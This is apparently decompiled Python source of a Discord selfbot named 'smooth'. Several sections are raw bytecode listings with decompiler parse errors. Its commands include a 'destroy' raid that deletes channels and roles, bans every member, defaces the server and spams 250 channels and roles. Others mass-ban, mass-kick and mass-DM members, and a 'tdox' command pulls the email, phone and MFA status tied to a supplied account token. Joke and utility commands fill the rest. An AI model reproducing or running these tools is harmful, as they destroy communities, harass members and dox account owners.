              160  POP_JUMP_IF_FALSE   190  'to 190'

 L.1213       162  LOAD_GLOBAL              print
              164  LOAD_STR                 '['
              166  LOAD_GLOBAL              Fore
              168  LOAD_ATTR                GREEN
              170  FORMAT_VALUE          0  ''
              172  LOAD_STR                 '+'
              174  LOAD_GLOBAL              Fore
              176  LOAD_ATTR                RESET
              178  FORMAT_VALUE          0  ''
              180  LOAD_STR                 '] New connection added!'
              182  BUILD_STRING_5        5  ''
              184  CALL_FUNCTION_1       1  ''
              186  POP_TOP          
              188  JUMP_FORWARD        224  'to 224'
            190_0  COME_FROM           160  '160'

 L.1215       190  LOAD_GLOBAL              print
              192  LOAD_STR                 '['
              194  LOAD_GLOBAL              Fore
              196  LOAD_ATTR                RED
              198  FORMAT_VALUE          0  ''
              200  LOAD_STR                 '-'
              202  LOAD_GLOBAL              Fore
              204  LOAD_ATTR                RESET
              206  FORMAT_VALUE          0  ''
              208  LOAD_STR                 '] Couldnt add connection!'
              210  BUILD_STRING_5        5  ''
              212  CALL_FUNCTION_1       1  ''
              214  POP_TOP          

 L.1215       216  POP_BLOCK        
              218  POP_TOP          
          220_222  JUMP_FORWARD        290  'to 290'
            224_0  COME_FROM           188  '188'
              224  POP_BLOCK        
              226  JUMP_BACK            90  'to 90'
            228_0  COME_FROM_FINALLY    94  '94'

 L.1216       228  DUP_TOP          
              230  LOAD_GLOBAL              Exception
              232  LOAD_GLOBAL              ValueError
              234  BUILD_TUPLE_2         2 
              236  COMPARE_OP               exception-match
          238_240  POP_JUMP_IF_FALSE   286  'to 286'
              242  POP_TOP          
              244  STORE_FAST               'e'
              246  POP_TOP          
              248  SETUP_FINALLY       274  'to 274'

 L.1217       250  LOAD_GLOBAL              print
              252  LOAD_FAST                'e'
              254  CALL_FUNCTION_1       1  ''
              256  POP_TOP          

 L.1217       258  POP_BLOCK        
              260  POP_EXCEPT       
              262  CALL_FINALLY        274  'to 274'
              264  POP_TOP          
          266_268  JUMP_FORWARD        290  'to 290'
              270  POP_BLOCK        
              272  BEGIN_FINALLY    
            274_0  COME_FROM           262  '262'
            274_1  COME_FROM_FINALLY   248  '248'
              274  LOAD_CONST               None
              276  STORE_FAST               'e'
              278  DELETE_FAST              'e'
              280  END_FINALLY      
              282  POP_EXCEPT       
              284  JUMP_BACK            90  'to 90'
            286_0  COME_FROM           238  '238'
              286  END_FINALLY      
              288  JUMP_BACK            90  'to 90'
            290_0  COME_FROM           266  '266'
            290_1  COME_FROM           220  '220'
            290_2  COME_FROM            90  '90'

 L.1218       290  LOAD_GLOBAL              print
              292  LOAD_STR                 '['
              294  LOAD_GLOBAL              Fore
              296  LOAD_ATTR                GREEN
              298  FORMAT_VALUE          0  ''
              300  LOAD_STR                 '+'
              302  LOAD_GLOBAL              Fore
              304  LOAD_ATTR                RESET
              306  FORMAT_VALUE          0  ''
              308  LOAD_STR                 '] Finished adding connections!'
              310  BUILD_STRING_5        5  ''
              312  CALL_FUNCTION_1       1  ''
              314  POP_TOP          

Parse error at or near `CALL_FINALLY' instruction at offset 262


        @smooth.command(aliases=['fakeconnection', 'spoofconnection'])
        async def fakenet(ctx, _type, *, name=None):
            await ctx.message.delete()
            ID = random.randrange(10000000, 90000000)
            avaliable = [
             'battlenet',
             'skype',
             'leagueoflegends']
            payload = {'name':name, 
             'visibility':1}
            headers = {'Authorization':token, 
             'Content-Type':'application/json'}
            if name is None:
                name = 'about:blank'
            elif _type not in avaliable:
                await ctx.send(f"Avaliable connections: `{avaliable}`", delete_after=3)
            r = requests.put(f"https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}", data=(json.dumps(payload)), headers=headers)
            if r.status_code == 200:
                await ctx.send(f"Added connection: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after=3)
            else:
                await ctx.send('Some error has happened with the endpoint', delete_after=3)


        @smooth.command(aliases=['tokinfo', 'tdox'])
        async def tokeninfo(ctx, _token):
            await ctx.message.delete()
            headers = {'Authorization':_token, 
             'Content-Type':'application/json'}
            try:
                res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
                res = res.json()
                user_id = res['id']
                locale = res['locale']
                avatar_id = res['avatar']
                language = languages.get(locale)
                creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
            except KeyError:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token" + Fore.RESET)
            else:
                em = discord.Embed(description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
                fields = [
                 {'name':'Phone', 
                  'value':res['phone']},
                 {'name':'Flags', 
                  'value':res['flags']},
                 {'name':'Local language', 
                  'value':res['locale'] + (f"{language}")},
                 {'name':'MFA?', 
                  'value':res['mfa_enabled']},
                 {'name':'Verified?', 
                  'value':res['verified']}]
                for field in fields:
                    if field['value']:
                        em.add_field(name=(field['name']), value=(field['value']), inline=False)
                        em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
                else:
                    return await ctx.send(embed=em)


        @smooth.command()
        async def copy(ctx):
            await ctx.message.delete()
            await smooth.create_guild(f"backup-{ctx.guild.name}")
            await asyncio.sleep(4)
            for g in smooth.guilds:
                if f"backup-{ctx.guild.name}" in g.name:
                    for c in g.channels:
                        await c.delete()

            else:
                for cate in ctx.guild.categories:
                    x = await g.create_category(f"{cate.name}")
                    for chann in cate.channels:
                        if isinstance(chann, discord.VoiceChannel):
                            await x.create_voice_channel(f"{chann}")
                        if isinstance(chann, discord.TextChannel):
                            await x.create_text_channel(f"{chann}")

            try:
                await g.edit(icon=(ctx.guild.icon_url))
            except:
                pass


        @smooth.command()
        async def destroy--- This code section failed: ---

 L.1302         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1303        16  LOAD_GLOBAL              list
               18  LOAD_FAST                'ctx'
               20  LOAD_ATTR                guild
               22  LOAD_ATTR                channels
               24  CALL_FUNCTION_1       1  ''
               26  GET_ITER         
             28_0  COME_FROM            64  '64'
             28_1  COME_FROM            60  '60'
             28_2  COME_FROM            50  '50'
               28  FOR_ITER             66  'to 66'
               30  STORE_FAST               'channel'

 L.1304        32  SETUP_FINALLY        52  'to 52'

 L.1305        34  LOAD_FAST                'channel'
               36  LOAD_METHOD              delete
               38  CALL_METHOD_0         0  ''
               40  GET_AWAITABLE    
               42  LOAD_CONST               None
               44  YIELD_FROM       
               46  POP_TOP          
               48  POP_BLOCK        
               50  JUMP_BACK            28  'to 28'
             52_0  COME_FROM_FINALLY    32  '32'

 L.1306        52  POP_TOP          
               54  POP_TOP          
               56  POP_TOP          

 L.1307        58  POP_EXCEPT       
               60  JUMP_BACK            28  'to 28'
               62  END_FINALLY      
               64  JUMP_BACK            28  'to 28'
             66_0  COME_FROM            28  '28'

 L.1308        66  LOAD_GLOBAL              list
               68  LOAD_FAST                'ctx'
               70  LOAD_ATTR                guild
               72  LOAD_ATTR                members
               74  CALL_FUNCTION_1       1  ''
               76  GET_ITER         
             78_0  COME_FROM           114  '114'
             78_1  COME_FROM           110  '110'
             78_2  COME_FROM           100  '100'
               78  FOR_ITER            116  'to 116'
               80  STORE_FAST               'user'

 L.1309        82  SETUP_FINALLY       102  'to 102'

 L.1310        84  LOAD_FAST                'user'
               86  LOAD_METHOD              ban
               88  CALL_METHOD_0         0  ''
               90  GET_AWAITABLE    
               92  LOAD_CONST               None
               94  YIELD_FROM       
               96  POP_TOP          
               98  POP_BLOCK        
              100  JUMP_BACK            78  'to 78'
            102_0  COME_FROM_FINALLY    82  '82'

 L.1311       102  POP_TOP          
              104  POP_TOP          
              106  POP_TOP          

 L.1312       108  POP_EXCEPT       
              110  JUMP_BACK            78  'to 78'
              112  END_FINALLY      
              114  JUMP_BACK            78  'to 78'
            116_0  COME_FROM            78  '78'

 L.1313       116  LOAD_GLOBAL              list
              118  LOAD_FAST                'ctx'
              120  LOAD_ATTR                guild
              122  LOAD_ATTR                roles
              124  CALL_FUNCTION_1       1  ''
              126  GET_ITER         
            128_0  COME_FROM           164  '164'
            128_1  COME_FROM           160  '160'
            128_2  COME_FROM           150  '150'
              128  FOR_ITER            166  'to 166'
              130  STORE_FAST               'role'

 L.1314       132  SETUP_FINALLY       152  'to 152'

 L.1315       134  LOAD_FAST                'role'
              136  LOAD_METHOD              delete
              138  CALL_METHOD_0         0  ''
              140  GET_AWAITABLE    
              142  LOAD_CONST               None
              144  YIELD_FROM       
              146  POP_TOP          
              148  POP_BLOCK        
              150  JUMP_BACK           128  'to 128'
            152_0  COME_FROM_FINALLY   132  '132'

 L.1316       152  POP_TOP          
              154  POP_TOP          
              156  POP_TOP          

 L.1317       158  POP_EXCEPT       
              160  JUMP_BACK           128  'to 128'
              162  END_FINALLY      
              164  JUMP_BACK           128  'to 128'
            166_0  COME_FROM           128  '128'

 L.1318       166  SETUP_FINALLY       202  'to 202'

 L.1319       168  LOAD_FAST                'ctx'
              170  LOAD_ATTR                guild
              172  LOAD_ATTR                edit

 L.1320       174  LOAD_GLOBAL              RandString
              176  CALL_FUNCTION_0       0  ''

 L.1321       178  LOAD_STR                 'https://hentaihaven.xxx'

 L.1322       180  LOAD_STR                 'I Love Hentai!'

 L.1323       182  LOAD_CONST               None

 L.1324       184  LOAD_CONST               None

 L.1319       186  LOAD_CONST               ('name', 'description', 'reason', 'icon', 'banner')
              188  CALL_FUNCTION_KW_5     5  '5 total positional and keyword args'
              190  GET_AWAITABLE    
              192  LOAD_CONST               None
              194  YIELD_FROM       
              196  POP_TOP          
              198  POP_BLOCK        
              200  JUMP_FORWARD        214  'to 214'
            202_0  COME_FROM_FINALLY   166  '166'

 L.1326       202  POP_TOP          
              204  POP_TOP          
              206  POP_TOP          

 L.1327       208  POP_EXCEPT       
              210  JUMP_FORWARD        214  'to 214'
              212  END_FINALLY      
            214_0  COME_FROM           210  '210'
            214_1  COME_FROM           200  '200'

 L.1328       214  LOAD_GLOBAL              range
              216  LOAD_CONST               250
              218  CALL_FUNCTION_1       1  ''
              220  GET_ITER         
            222_0  COME_FROM           248  '248'
              222  FOR_ITER            250  'to 250'
              224  STORE_FAST               '_i'

 L.1329       226  LOAD_FAST                'ctx'
              228  LOAD_ATTR                guild
              230  LOAD_ATTR                create_text_channel
              232  LOAD_GLOBAL              RandString
              234  CALL_FUNCTION_0       0  ''
              236  LOAD_CONST               ('name',)
              238  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
              240  GET_AWAITABLE    
              242  LOAD_CONST               None
              244  YIELD_FROM       
              246  POP_TOP          
              248  JUMP_BACK           222  'to 222'
            250_0  COME_FROM           222  '222'

 L.1330       250  LOAD_GLOBAL              range
              252  LOAD_CONST               250
              254  CALL_FUNCTION_1       1  ''
              256  GET_ITER         
            258_0  COME_FROM           288  '288'
              258  FOR_ITER            292  'to 292'
              260  STORE_FAST               '_i'

 L.1331       262  LOAD_FAST                'ctx'
              264  LOAD_ATTR                guild
              266  LOAD_ATTR                create_role
              268  LOAD_GLOBAL              RandString
              270  CALL_FUNCTION_0       0  ''
              272  LOAD_GLOBAL              RandomColor
              274  CALL_FUNCTION_0       0  ''
              276  LOAD_CONST               ('name', 'color')
              278  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              280  GET_AWAITABLE    
              282  LOAD_CONST               None
              284  YIELD_FROM       
              286  POP_TOP          
          288_290  JUMP_BACK           258  'to 258'
            292_0  COME_FROM           258  '258'

Parse error at or near `JUMP_BACK' instruction at offset 60


        @smooth.command()
        async def dmall--- This code section failed: ---

 L.1335         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1336        16  LOAD_GLOBAL              list
               18  LOAD_FAST                'ctx'
               20  LOAD_ATTR                guild
               22  LOAD_ATTR                members
               24  CALL_FUNCTION_1       1  ''
               26  GET_ITER         
             28_0  COME_FROM            82  '82'
             28_1  COME_FROM            78  '78'
             28_2  COME_FROM            68  '68'
               28  FOR_ITER             84  'to 84'
               30  STORE_FAST               'user'

 L.1337        32  SETUP_FINALLY        70  'to 70'

 L.1338        34  LOAD_GLOBAL              asyncio
               36  LOAD_METHOD              sleep
               38  LOAD_CONST               5
               40  CALL_METHOD_1         1  ''
               42  GET_AWAITABLE    
               44  LOAD_CONST               None
               46  YIELD_FROM       
               48  POP_TOP          

 L.1339        50  LOAD_FAST                'user'
               52  LOAD_METHOD              send
               54  LOAD_FAST                'message'
               56  CALL_METHOD_1         1  ''
               58  GET_AWAITABLE    
               60  LOAD_CONST               None
               62  YIELD_FROM       
               64  POP_TOP          
               66  POP_BLOCK        
               68  JUMP_BACK            28  'to 28'
             70_0  COME_FROM_FINALLY    32  '32'

 L.1340        70  POP_TOP          
               72  POP_TOP          
               74  POP_TOP          

 L.1341        76  POP_EXCEPT       
               78  JUMP_BACK            28  'to 28'
               80  END_FINALLY      
               82  JUMP_BACK            28  'to 28'
             84_0  COME_FROM            28  '28'

Parse error at or near `JUMP_BACK' instruction at offset 78


        @smooth.command()
        async def massban--- This code section failed: ---

 L.1345         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1346        16  LOAD_GLOBAL              list
               18  LOAD_FAST                'ctx'
               20  LOAD_ATTR                guild
               22  LOAD_ATTR                members
               24  CALL_FUNCTION_1       1  ''
               26  GET_ITER         
             28_0  COME_FROM            64  '64'
             28_1  COME_FROM            60  '60'
             28_2  COME_FROM            50  '50'
               28  FOR_ITER             66  'to 66'
               30  STORE_FAST               'user'

 L.1347        32  SETUP_FINALLY        52  'to 52'

 L.1348        34  LOAD_FAST                'user'
               36  LOAD_METHOD              ban
               38  CALL_METHOD_0         0  ''
               40  GET_AWAITABLE    
               42  LOAD_CONST               None
               44  YIELD_FROM       
               46  POP_TOP          
               48  POP_BLOCK        
               50  JUMP_BACK            28  'to 28'
             52_0  COME_FROM_FINALLY    32  '32'

 L.1349        52  POP_TOP          
               54  POP_TOP          
               56  POP_TOP          

 L.1350        58  POP_EXCEPT       
               60  JUMP_BACK            28  'to 28'
               62  END_FINALLY      
               64  JUMP_BACK            28  'to 28'
             66_0  COME_FROM            28  '28'

Parse error at or near `JUMP_BACK' instruction at offset 60


        @smooth.command()
        async def masskick--- This code section failed: ---

 L.1354         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1355        16  LOAD_GLOBAL              list
               18  LOAD_FAST                'ctx'
               20  LOAD_ATTR                guild
               22  LOAD_ATTR                members
               24  CALL_FUNCTION_1       1  ''
               26  GET_ITER         
             28_0  COME_FROM            64  '64'
             28_1  COME_FROM            60  '60'
             28_2  COME_FROM            50  '50'
               28  FOR_ITER             66  'to 66'
               30  STORE_FAST               'user'

 L.1356        32  SETUP_FINALLY        52  'to 52'

 L.1357        34  LOAD_FAST                'user'
               36  LOAD_METHOD              kick
               38  CALL_METHOD_0         0  ''
               40  GET_AWAITABLE    
               42  LOAD_CONST               None
               44  YIELD_FROM       
               46  POP_TOP          
               48  POP_BLOCK        
               50  JUMP_BACK            28  'to 28'
             52_0  COME_FROM_FINALLY    32  '32'

 L.1358        52  POP_TOP          
               54  POP_TOP          
               56  POP_TOP          

 L.1359        58  POP_EXCEPT       
               60  JUMP_BACK            28  'to 28'
               62  END_FINALLY      
               64  JUMP_BACK            28  'to 28'
             66_0  COME_FROM            28  '28'

Parse error at or near `JUMP_BACK' instruction at offset 60


        @smooth.command()
        async def massrole--- This code section failed: ---

 L.1363         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1364        16  LOAD_GLOBAL              range
               18  LOAD_CONST               250
               20  CALL_FUNCTION_1       1  ''
               22  GET_ITER         
             24_0  COME_FROM            76  '76'
             24_1  COME_FROM            58  '58'
               24  FOR_ITER             78  'to 78'
               26  STORE_FAST               '_i'

 L.1365        28  SETUP_FINALLY        60  'to 60'

 L.1366        30  LOAD_FAST                'ctx'
               32  LOAD_ATTR                guild
               34  LOAD_ATTR                create_role
               36  LOAD_GLOBAL              RandString
               38  CALL_FUNCTION_0       0  ''
               40  LOAD_GLOBAL              RandomColor
               42  CALL_FUNCTION_0       0  ''
               44  LOAD_CONST               ('name', 'color')
               46  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               48  GET_AWAITABLE    
               50  LOAD_CONST               None
               52  YIELD_FROM       
               54  POP_TOP          
               56  POP_BLOCK        
               58  JUMP_BACK            24  'to 24'
             60_0  COME_FROM_FINALLY    28  '28'

 L.1367        60  POP_TOP          
               62  POP_TOP          
               64  POP_TOP          

 L.1368        66  POP_EXCEPT       
               68  POP_TOP          
               70  LOAD_CONST               None
               72  RETURN_VALUE     
               74  END_FINALLY      
               76  JUMP_BACK            24  'to 24'
             78_0  COME_FROM            24  '24'

Parse error at or near `POP_TOP' instruction at offset 68


        @smooth.command()
        async def masschannel--- This code section failed: ---

 L.1372         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1373        16  LOAD_GLOBAL              range
               18  LOAD_CONST               250
               20  CALL_FUNCTION_1       1  ''
               22  GET_ITER         
             24_0  COME_FROM            72  '72'
             24_1  COME_FROM            54  '54'
               24  FOR_ITER             74  'to 74'
               26  STORE_FAST               '_i'

 L.1374        28  SETUP_FINALLY        56  'to 56'

 L.1375        30  LOAD_FAST                'ctx'
               32  LOAD_ATTR                guild
               34  LOAD_ATTR                create_text_channel
               36  LOAD_GLOBAL              RandString
               38  CALL_FUNCTION_0       0  ''
               40  LOAD_CONST               ('name',)
               42  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               44  GET_AWAITABLE    
               46  LOAD_CONST               None
               48  YIELD_FROM       
               50  POP_TOP          
               52  POP_BLOCK        
               54  JUMP_BACK            24  'to 24'
             56_0  COME_FROM_FINALLY    28  '28'

 L.1376        56  POP_TOP          
               58  POP_TOP          
               60  POP_TOP          

 L.1377        62  POP_EXCEPT       
               64  POP_TOP          
               66  LOAD_CONST               None
               68  RETURN_VALUE     
               70  END_FINALLY      
               72  JUMP_BACK            24  'to 24'
             74_0  COME_FROM            24  '24'

Parse error at or near `POP_TOP' instruction at offset 64


        @smooth.command()
        async def delchannels--- This code section failed: ---

 L.1381         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1382        16  LOAD_GLOBAL              list
               18  LOAD_FAST                'ctx'
               20  LOAD_ATTR                guild
               22  LOAD_ATTR                channels
               24  CALL_FUNCTION_1       1  ''
               26  GET_ITER         
             28_0  COME_FROM            68  '68'
             28_1  COME_FROM            50  '50'
               28  FOR_ITER             70  'to 70'
               30  STORE_FAST               'channel'

 L.1383        32  SETUP_FINALLY        52  'to 52'

 L.1384        34  LOAD_FAST                'channel'
               36  LOAD_METHOD              delete
               38  CALL_METHOD_0         0  ''
               40  GET_AWAITABLE    
               42  LOAD_CONST               None
               44  YIELD_FROM       
               46  POP_TOP          
               48  POP_BLOCK        
               50  JUMP_BACK            28  'to 28'
             52_0  COME_FROM_FINALLY    32  '32'

 L.1385        52  POP_TOP          
               54  POP_TOP          
               56  POP_TOP          

 L.1386        58  POP_EXCEPT       
               60  POP_TOP          
               62  LOAD_CONST               None
               64  RETURN_VALUE     
               66  END_FINALLY      
               68  JUMP_BACK            28  'to 28'
             70_0  COME_FROM            28  '28'

Parse error at or near `POP_TOP' instruction at offset 60


        @smooth.command()
        async def delroles--- This code section failed: ---

 L.1390         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1391        16  LOAD_GLOBAL              list
               18  LOAD_FAST                'ctx'
               20  LOAD_ATTR                guild
               22  LOAD_ATTR                roles
               24  CALL_FUNCTION_1       1  ''
               26  GET_ITER         
             28_0  COME_FROM            64  '64'
             28_1  COME_FROM            60  '60'
             28_2  COME_FROM            50  '50'
               28  FOR_ITER             66  'to 66'
               30  STORE_FAST               'role'

 L.1392        32  SETUP_FINALLY        52  'to 52'

 L.1393        34  LOAD_FAST                'role'
               36  LOAD_METHOD              delete
               38  CALL_METHOD_0         0  ''
               40  GET_AWAITABLE    
               42  LOAD_CONST               None
               44  YIELD_FROM       
               46  POP_TOP          
               48  POP_BLOCK        
               50  JUMP_BACK            28  'to 28'
             52_0  COME_FROM_FINALLY    32  '32'

 L.1394        52  POP_TOP          
               54  POP_TOP          
               56  POP_TOP          

 L.1395        58  POP_EXCEPT       
               60  JUMP_BACK            28  'to 28'
               62  END_FINALLY      
               64  JUMP_BACK            28  'to 28'
             66_0  COME_FROM            28  '28'

Parse error at or near `JUMP_BACK' instruction at offset 60


        @smooth.command()
        async def massunban--- This code section failed: ---

 L.1399         0  LOAD_FAST                'ctx'
                2  LOAD_ATTR                message
                4  LOAD_METHOD              delete
                6  CALL_METHOD_0         0  ''
                8  GET_AWAITABLE    
               10  LOAD_CONST               None
               12  YIELD_FROM       
               14  POP_TOP          

 L.1400        16  LOAD_FAST                'ctx'
               18  LOAD_ATTR                guild
               20  LOAD_METHOD              bans
               22  CALL_METHOD_0         0  ''
               24  GET_AWAITABLE    
               26  LOAD_CONST               None
               28  YIELD_FROM       
               30  STORE_FAST               'banlist'

 L.1401        32  LOAD_FAST                'banlist'
               34  GET_ITER         
             36_0  COME_FROM            96  '96'
             36_1  COME_FROM            92  '92'
             36_2  COME_FROM            82  '82'
               36  FOR_ITER             98  'to 98'
               38  STORE_FAST               'users'

 L.1402        40  SETUP_FINALLY        84  'to 84'

 L.1403        42  LOAD_GLOBAL              asyncio
               44  LOAD_METHOD              sleep
               46  LOAD_CONST               2
               48  CALL_METHOD_1         1  ''
               50  GET_AWAITABLE    
               52  LOAD_CONST               None
               54  YIELD_FROM       
               56  POP_TOP          

 L.1404        58  LOAD_FAST                'ctx'
               60  LOAD_ATTR                guild
               62  LOAD_ATTR                unban
               64  LOAD_FAST                'users'
               66  LOAD_ATTR                user
               68  LOAD_CONST               ('user',)
               70  CALL_FUNCTION_KW_1     1  '1 total positional and keyword args'
               72  GET_AWAITABLE    
               74  LOAD_CONST               None
               76  YIELD_FROM       
               78  POP_TOP          
               80  POP_BLOCK        
               82  JUMP_BACK            36  'to 36'
             84_0  COME_FROM_FINALLY    40  '40'

 L.1405        84  POP_TOP          
               86  POP_TOP          
               88  POP_TOP          

 L.1406        90  POP_EXCEPT       
               92  JUMP_BACK            36  'to 36'
               94  END_FINALLY      
               96  JUMP_BACK            36  'to 36'
             98_0  COME_FROM            36  '36'

Parse error at or near `JUMP_BACK' instruction at offset 92


        @smooth.command()
        async def spam(ctx, amount: int, *, message):
            await ctx.message.delete()
            for _i in range(amount):
                await ctx.send(message)


        @smooth.command()
        async def dm(ctx, user: discord.Member, *, message):
            await ctx.message.delete()
            user = smooth.get_user(user.id)
            if ctx.author.id == smooth.user.id:
                return
            try:
                await user.send(message)
            except:
                pass


        @smooth.command(name='get-color', aliases=['color', 'colour', 'sc'])
        async def _get_color(ctx, *, color: discord.Colour):
            await ctx.message.delete()
            file = io.BytesIO()
            Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
            file.seek(0)
            em = discord.Embed(color=color, title=f"Showing Color: {str(color)}")
            em.set_image(url='attachment://color.png')
            await ctx.send(file=(discord.File(file, 'color.png')), embed=em)


        @smooth.command()
        async def tinyurl(ctx, *, link):
            await ctx.message.delete()
            r = requests.get(f"http://tinyurl.com/api-create.php?url={link}").text
            em = discord.Embed()
            em.add_field(name='Shortened link', value=r, inline=False)
            await ctx.send(embed=em)


        @smooth.command(aliases=['rainbow-role'])
        async def rainbow(ctx, *, role):
            await ctx.message.delete()
            role = discord.utils.get((ctx.guild.roles), name=role)
            while True:
                try:
                    await role.edit(role=role, colour=(RandomColor()))
                    await asyncio.sleep(10)
                except:
                    pass


        @smooth.command(name='8ball')
        async def _ball(ctx, *, question):
            await ctx.message.delete()
            responses = [
             'That is a resounding no',
             'It is not looking likely',
             'Too hard to tell',
             'It is quite possible',
             'That is a definite yes!',
             'Maybe',
             'There is a good chance']
            answer = random.choice(responses)
            embed = discord.Embed()
            embed.add_field(name='Question', value=question, inline=False)
            embed.add_field(name='Answer', value=answer, inline=False)
            embed.set_thumbnail(url='https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png')
            embed.set_footer(text=(datetime.datetime.now()))
            await ctx.send(embed=embed)


        @smooth.command(aliases=['slots', 'bet'])
        async def slot(ctx):
            await ctx.message.delete()
            emojis = '🍎🍊🍐🍋🍉🍇🍓🍒'
            a = random.choice(emojis)
            b = random.choice(emojis)
            c = random.choice(emojis)
            slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
            if a == b == c:
                await ctx.send(embed=(discord.Embed.from_dict({'title':'Slot machine',  'description':f"{slotmachine} All matchings, you won!"})))
            elif a == b or a == c or b == c:
                await ctx.send(embed=(discord.Embed.from_dict({'title':'Slot machine',  'description':f"{slotmachine} 2 in a row, you won!"})))
            else:
                await ctx.send(embed=(discord.Embed.from_dict({'title':'Slot machine',  'description':f"{slotmachine} No match, you lost"})))


        @smooth.command()
        async def joke(ctx):
            await ctx.message.delete()
            headers = {'Accept': 'application/json'}
            async with aiohttp.ClientSession() as session:
                async with session.get('https://icanhazdadjoke.com', headers=headers) as req:
                    r = await req.json()
            await ctx.send(r['joke'])


        @smooth.command(name='auto-bump', aliases=['bump'])
        async def _auto_bump(ctx, channelid):
            await ctx.message.delete()
            count = 0
            while True:
                try:
                    count += 1
                    channel = smooth.get_channel(int(channelid))
                    await channel.send('!d bump')
                    print(f"{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent" + Fore.RESET)
                    await asyncio.sleep(7200)
                except Exception as e:
                    try:
                        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
                    finally:
                        e = None
                        del e


        @smooth.command()
        async def tts(ctx, *, message):
            await ctx.message.delete()
            buff = await do_tts(message)
            await ctx.send(file=(discord.File(buff, f"{message}.wav")))


        @smooth.command()
        async def upper(ctx, *, message):
            await ctx.message.delete()
            message = message.upper()
            await ctx.send(message)


        @smooth.command(aliases=['guildpfp'])
        async def guildicon(ctx):
            await ctx.message.delete()
            em = discord.Embed(title=(ctx.guild.name))
            em.set_image(url=(ctx.guild.icon_url))
            await ctx.send(embed=em)


        @smooth.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
        async def _backup_f(ctx):
            await ctx.message.delete()
            for friend in smooth.user.friends:
                friendlist = friend.name + '#' + friend.discriminator
                with open('Backup/Friends.txt', 'a+') as f:
                    f.write(friendlist + '\n')
            else:
                for block in smooth.user.blocked:
                    blocklist = block.name + '#' + block.discriminator
                    with open('Backup/Blocked.txt', 'a+') as f:
                        f.write(blocklist + '\n')


        @smooth.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
        async def _first_message(ctx, channel: discord.TextChannel=None):
            await ctx.message.delete()
            if channel is None:
                channel = ctx.channel
            first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
            embed = discord.Embed(description=(first_message.content))
            embed.add_field(name='First Message', value=f"[Jump]({first_message.jump_url})")
            await ctx.send(embed=embed)


        @smooth.command()
        async def mac(ctx, mac):
            await ctx.message.delete()
            r = requests.get('http://api.macvendors.com/' + mac)
            em = discord.Embed(title='MAC Lookup Result', description=(r.text), colour=14593471)
            em.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
            await ctx.send(embed=em)


        @smooth.command()
        async def abc(ctx):
            await ctx.message.delete()
            ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
            message = await ctx.send(ABC[0])
            await asyncio.sleep(2)
            for _next in ABC[1:]:
                await message.edit(content=_next)
                await asyncio.sleep(2)


        @smooth.command(aliases=['bitcoin'])
        async def btc(ctx):
            await ctx.message.delete()
            r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
            r = r.json()
            usd = r['USD']
            eur = r['EUR']
            em = discord.Embed(description=f"USD: `{str(usd)}$`\nEUR: `{str(eur)}€`")
